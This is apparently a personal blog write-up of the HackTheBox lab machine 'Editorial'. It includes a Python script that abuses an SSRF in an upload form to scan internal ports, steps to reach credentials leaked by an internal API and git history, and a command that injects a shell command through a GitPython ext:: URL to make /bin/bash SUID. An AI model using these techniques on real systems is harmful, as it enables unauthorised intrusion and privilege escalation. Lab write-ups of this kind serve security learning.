---
title: Editorial Hackthebox
date: 13-7-2024
categories: [hackthebox,writeup] 
tags: [Gitpython,scripting,SSRF]
---

# Editorial

![Editorial](/assets/img/editorial/editorial.jpeg)

Editorial is a season 5 machine from week 9. It is an easy box but somehow the enumeration part need to be really careful. The host have two(2) port open and one of it is http port. We found a file upload function where it have a book url input. The url input can be connect to our python web server. However, we can find an internal port from the function. Once we get the foothold, we found .git repo where it leak the user credentials. A python script can be run as sudo with that user. Finally, we can get root with an exploit found in library in python script.


## **Recon**

We launch NMAP Scan.

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the web application, theres an upload file function. The yellow highlighted in below image is the injection point where we can access the internal port.

![alt text](/assets/img/editorial/image-1.png)

Below screenshot shows that the URL will try to connect our python web server once we supply the URL input. The screenshow below is my local IP.

![alt text](/assets/img/editorial/image-2.png)

Moving on, I try numerous type of file to upload it to the server. However, the application does not have access to see the uploaded file. We can try to use the localhost IP address and see the response with burpsuite. It shows that an image has been response from the localhost URL. We can enumerate the internal port from here.

![alt text](/assets/img/editorial/image-4.png)

We can enumerate it with the script below. The script below will enumerate each of the port number and provide the response of each port.

```python
import requests

def file_upload(ports):
    url = "http://editorial.htb/upload-cover"
    headers = {
        "Host": "editorial.htb",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "multipart/form-data; boundary=---------------------------2558739193374546790339287871",
        "Origin": "http://editorial.htb",
        "Connection": "close",
        "Referer": "http://editorial.htb/upload"
    }
    data = (
        "-----------------------------2558739193374546790339287871\r\n"
        'Content-Disposition: form-data; name="bookurl"\r\n\r\n'
        f"http://127.0.0.1:{ports}/\r\n"
        "-----------------------------2558739193374546790339287871\r\n"
        'Content-Disposition: form-data; name="bookfile"; filename="test.txt"\r\n'
        "Content-Type: text/plain\r\n\r\n"
        "test content\r\n"
        "-----------------------------2558739193374546790339287871--\r\n"
    )

    x = requests.post(url,headers=headers,data=data)
    return x.status_code, x.text

port = range(4000,5500)
for ports in port:
    status_code, text = file_upload(ports)
    if text not in "/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg":
        print(f"[+] Port {ports} : Status code = {status_code} & Response = {text}")
    else:
        print(f"[+] Port {ports}: Same response")

```

The result show that the response of the port 5000 is different from the other port. It gave us a new endpoint we can look at it.

![alt text](/assets/img/editorial/image-7.png)

We can browse thru the new endpoint with burp.

![alt text](/assets/img/editorial/image-8.png)

From the above image, we can browse to each of the endpoint that we've found. We can browse it thru the input injection point to get the content of the file. Below is the content of **"/api/latest/metadata/messages/authors"** endpoint. The content reveal a credentials.

![alt text](/assets/img/editorial/image-9.png)

We can ssh into the server with the credentials provide from the previous image.

![alt text](/assets/img/editorial/image-10.png)

## dev Shell

In dev home directory, we can find .git repo in /apps directory. From there, we can see the git log for the repo.

![alt text](/assets/img/editorial/image-11.png)

We can see the content of the git log we found with **"git show"** command.

![alt text](/assets/img/editorial/image-12.png)

## prod shell

Run sudo -l to check whether our current user can run any file as root.

![alt text](/assets/img/editorial/image-15.png)

The result shows that a python script can be run as root. We can review the python script and look for any information that we can use.

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

We can see that the function of this script is to clone a git repo into the "/opt/internal_apps/clone_changes". After several time of research and try to find the exploitation path. The git library have a rce vulnerability [gitPython](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858). We can view the git version with **pip list** command to look for the installed library.

![alt text](/assets/img/editorial/image-16.png)

In order to exploit it, we can use this vulnerability that we've found and craft a malicious code. Below is how i exploit the 

![alt text](/assets/img/editorial/image-14.png)

Below are the command that can be used to grant **/bin/bash** file SUID permission.

```bash

sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% +s% /bin/bash'
```


Thank you for reading.
